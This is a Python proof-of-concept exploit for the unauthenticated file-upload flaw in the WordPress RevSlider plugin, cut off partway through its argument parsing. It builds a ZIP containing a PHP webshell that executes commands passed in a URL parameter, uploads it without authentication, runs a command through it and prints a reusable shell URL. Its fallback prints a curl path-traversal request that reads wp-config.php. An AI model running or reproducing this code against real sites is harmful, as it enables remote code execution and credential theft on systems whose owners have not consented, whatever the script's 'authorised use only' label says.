#!/usr/bin/env python3
"""revslider_poc.py — proof-of-exploit for the classic Slider Revolution
(RevSlider) UNAUTHENTICATED arbitrary file upload.

Public, well-documented vector (SoakSoak campaign 2014; Exploit-DB EDB-35385;
Metasploit `exploit/unix/webapp/wp_revslider_upload_execute`; CVE-2014-9735
family). The plugin's AJAX `update_plugin` action unzips an attacker-supplied
archive into
    wp-content/plugins/revslider/temp/update_extract/revslider/
with NO authentication. A ZIP carrying a .php file therefore lands
web-accessible → remote code execution.

This plants a MARKER webshell, runs ONE command to prove execution, prints the
proof, and tells you the exact file to delete afterward.

AUTHORISED / clone use ONLY.

  python3 revslider_poc.py https://clone.tld            # plant + prove (runs `id`)
  python3 revslider_poc.py https://clone.tld --cmd 'uname -a'
  python3 revslider_poc.py --self-test                  # offline: verify the zip we build
"""
import argparse
import io
import secrets
import sys
import zipfile

AJAX = "/wp-admin/admin-ajax.php"
EXTRACT = "/wp-content/plugins/revslider/temp/update_extract/revslider/"


def build_zip(php_name, token):
    """A ZIP whose inner path is `revslider/<php_name>` — that inner 'revslider/'
    is what makes the plugin extract it into its own temp dir."""
    start, end = f"RSPOC_{token}_START", f"RSPOC_{token}_END"
    shell = (f"<?php echo '{start}'; "
             f"if(isset($_GET['c'])) system($_GET['c']); "
             f"echo '{end}';")
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
        z.writestr(f"revslider/{php_name}", shell)
    return buf.getvalue()


def run(base, cmd, timeout):
    import requests
    try:
        import urllib3
        urllib3.disable_warnings()
    except Exception:
        pass

    base = base.rstrip("/")
    token = secrets.token_hex(4)
    php = f"rspoc_{token}.php"
    zbytes = build_zip(php, token)

    print(f"[*] target : {base}")
    print("[*] step 1 : uploading marker shell via revslider 'update_plugin' (no auth)…")
    up = requests.post(
        base + AJAX,
        data={"action": "revslider_ajax_action", "client_action": "update_plugin"},
        files={"update_file": (php + ".zip", zbytes, "application/zip")},
        verify=False, timeout=timeout,
    )
    print(f"            upload responded HTTP {up.status_code}")

    shell_url = base + EXTRACT + php
    print(f"[*] step 2 : requesting extracted shell + running `{cmd}`")
    print(f"            {shell_url}")
    v = requests.get(shell_url, params={"c": cmd}, verify=False, timeout=timeout)

    start, end = f"RSPOC_{token}_START", f"RSPOC_{token}_END"
    if start in v.text:
        out = v.text.split(start, 1)[1].split(end, 1)[0].strip()
        print("\n  ✅  HARD PROOF — unauthenticated remote code execution CONFIRMED")
        print( "  ─────────────────────────────────────────────────────────────")
        print(f"  command : {cmd}")
        print(f"  output  : {out}")
        print(f"  shell   : {shell_url}?c=<any command>")
        print(f"\n  CLEANUP : delete this file on the server →")
        print(f"            {EXTRACT}{php}")
        print(f"            (and wp-content/plugins/revslider/temp/update_extract/)")
        return 0

    print(f"\n  ✗  marker not returned (HTTP {v.status_code}).")
    print("     This RevSlider build may not be vulnerable to the update_plugin")
    print("     upload vector, or it extracts elsewhere. Try the LFI variant:")
    print(f"     curl -k '{base}{AJAX}?action=revslider_show_image&img=../wp-config.php'")
    return 1


def _self_test():
    z = build_zip("x.php", "abcd1234")
    with zipfile.ZipFile(io.BytesIO(z)) as zf:
        names = zf.namelist()
        assert names == ["revslider/x.php"], names
        body = zf.read("revslider/x.php").decode()
        assert "RSPOC_abcd1234_START" in body and "system($_GET['c'])" in body
    print("self-test OK: zip carries revslider/x.php with the marker shell")
    return 0


def main():
    ap = argparse.ArgumentParser(description="RevSlider unauth file-upload PoC (authorized/clone use only)")
    ap.add_argument("target", nargs="?", help="https://clone.tld")
    ap.add_argument("--cmd", default="id", help="command to run as proof (default: id)")
    ap.add_arg